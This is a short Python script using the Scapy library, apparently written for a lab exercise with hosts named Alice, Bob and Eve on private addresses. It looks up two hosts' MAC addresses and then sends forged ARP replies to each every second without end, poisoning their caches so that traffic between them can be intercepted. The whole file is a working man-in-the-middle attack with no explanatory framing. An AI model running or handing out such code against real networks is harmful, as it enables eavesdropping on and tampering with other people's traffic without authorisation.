from scapy.all import ARP, send, Ether, srp
import time

def get_mac(ip):
    """Получает MAC-адрес устройства по его IP"""
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        return None

alice_ip = "10.0.1.2"
bob_ip = "10.0.1.3"
eve_ip = "10.0.1.4"

alice_mac = get_mac(alice_ip)
bob_mac = get_mac(bob_ip)

def arp_spoof():
    while True:
        send(ARP(op=2, pdst=alice_ip, psrc=bob_ip, hwdst=alice_mac), verbose=False)
        send(ARP(op=2, pdst=bob_ip, psrc=alice_ip, hwdst=bob_mac), verbose=False)
        time.sleep(1)

if __name__ == "__main__":
    arp_spoof()
